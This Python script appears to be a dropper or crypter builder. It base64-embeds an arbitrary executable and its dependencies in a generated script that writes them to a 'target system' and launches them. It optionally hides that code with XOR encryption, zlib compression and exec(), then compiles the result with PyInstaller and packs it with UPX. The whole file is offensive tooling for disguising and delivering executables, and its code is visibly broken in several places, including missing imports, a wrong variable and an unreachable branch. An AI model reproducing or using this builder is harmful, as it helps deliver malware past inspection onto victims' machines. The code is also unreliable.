try:
        import sys, subprocess, tempfile, uuid, zlib, os, base64
        from itertools import cycle
        from zipfile import ZipFile
        import PyInstaller.__main__, pip
except:
        try:
                from pip._internal import main as pipmain
                pipmain(['install', 'PyInstaller'])
                pipmain(['install', 'uuid'])
        except:
                print("Please install required packages...")
                exit(1)

imports = """
import subprocess, base64, os
from zipfile import ZipFile
"""

payload = """
def xor(data, key): 
        return ''.join(chr(ord(c)^ord(k)) for c,k in zip(data, cycle(key)))
#code
try:
        path = '{{ installdir }}'
        if not os.path.exists(path + '{{ filename }}'):
                with open(path + '{{ filename }}', 'wb') as writexe:
                        writexe.write(base64.b64decode('{{ filedata }}'))
        #dependencies
        if not os.path.exists(path + '{{ deps }}'):
                with open(path + '{{ deps }}.zip', 'wb') as writedeps:
                        writedeps.write(base64.b64decode('{{ archive }}'))
                with ZipFile(path + '{{ deps }}.zip', 'r') as zip:
                    zip.extractall(path + '{{ deps }}')
                os.remove(path + '{{ deps }}.zip')
        #dependencies
        subprocess.Popen(path + '{{ filename }}')
except:
        print('Launch again as an administrator')
        os.system('pause')
"""
#payload = {{ encryption }}({{ compression }}(base64.b64decode('{}'))) #payload encryption embedded
usage = """Usage:
[-d localfolder] Dependencies folder path
[-f localexe] Executable file path
[-c] Compression
[-e] Encryption
[-upx upxpath] Use upx packer
[-i path] Installation path on target system
"""

def readlines(filename):
        data = b""
        with open(filename, 'rb') as file:
            for line in file:
                data += line
        return data

def xor(data, key): 
    return ''.join(chr(ord(c)^ord(k)) for c,k in zip(data, cycle(key)))

rand_str = lambda n: ''.join([random.choice(string.ascii_lowercase) for i in range(n)])

deps = ""
final = ""
upxdir = ""
file = ""
folder = ""
key = ""
archive = ""
enc = False
comp = False
upx = False
i = 0
if len(sys.argv)>1 and "-f" in sys.argv:
        for arg in sys.argv:
                if arg == "-d":
                        deps = sys.argv[i+1]
                elif arg == "-f":
                        filearg = sys.argv[i+1]
                elif arg == "-i":
                        folder = sys.argv[i+1]
                elif arg == "-c":
                        comp = True 
                        imports+="import zlib\n" #bz2 instead of zlib (gz) for better ratio
                elif arg == "-e":
                        key = str(uuid.uuid4().hex)
                        enc = True
                elif arg == "-upx":
                        upx = True
                        imports+="from itertools import cycle\n"
                        upxdir = sys.argv[i+1]
                #elif arg == "-gui": gui = True
                i+=1
else:
        print(usage)
        exit(1)

#if folder == "":
        #imports+="import tempfile\npath = tempfile.gettempdir()"

if "-d" in sys.argv:
        def get_all_file_paths(directory):
            file_paths = []
            for root, directories, files in os.walk(directory):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    file_paths.append(filepath)
            return file_paths   

        print('Zipping resources...')
        with ZipFile(deps + '.zip','w') as zipfile:
                for file in get_all_file_paths(deps):
                    zip.write(file)

        print('Reading the resource file...')
        archive = readlines(deps + '.zip')

print('Reading the executable file...')
executable = readlines(filearg)

if not "-d" in sys.argv:
	payload = payload.split("#dependencies")[0]+payload.split("#dependencies")[2]
else:
        payload = payload.replace("{{ archive }}",base64.b64encode(archive).decode()).replace("{{ deps }}",deps)

final = payload.replace("{{ installdir }}",folder).replace("{{ filename }}",filearg).replace("{{ filedata }}",base64.b64encode(executable).decode())

newline = "\n" #backslashs are not allowed in f strings

if enc:
        final = f'{imports}{newline}{final.split("#code")[0]}{newline}exec(xor(base64.b64decode({base64.b64encode(xor(final.split("#code")[1], key).encode())}), {key}))'
elif enc and comp:
        final = f'{imports}{newline}{final.split("#code")[0]}{newline}exec(zlib.decompress(xor(base64.b64decode({base64.b64encode(xor(zlib.compress(final.split("#code")[1]), key).encode())}), {key})))'
elif comp:
        final = f'{imports}{newline}exec(zlib.decompress(base64.b64decode({base64.b64encode(zlib.compress(final.split("#code")[1].encode()))})))'
else:
        final = f'{imports}{newline}exec(base64.b64decode({base64.b64encode(final.split("#code")[1].encode())}))'

with open("payload.py", "w") as pay:
        pay.write(final)

print('Compiling...')
PyInstaller.__main__.run(['-F', '--clean', '--onefile', 'payload.py'])
if upx:
        print('Applying upx...')
        subprocess.getoutput(f"{upxdir} {os.path.abspath('dist/payload.exe')}")

#haha you expected 'if __name__=="__main__":'
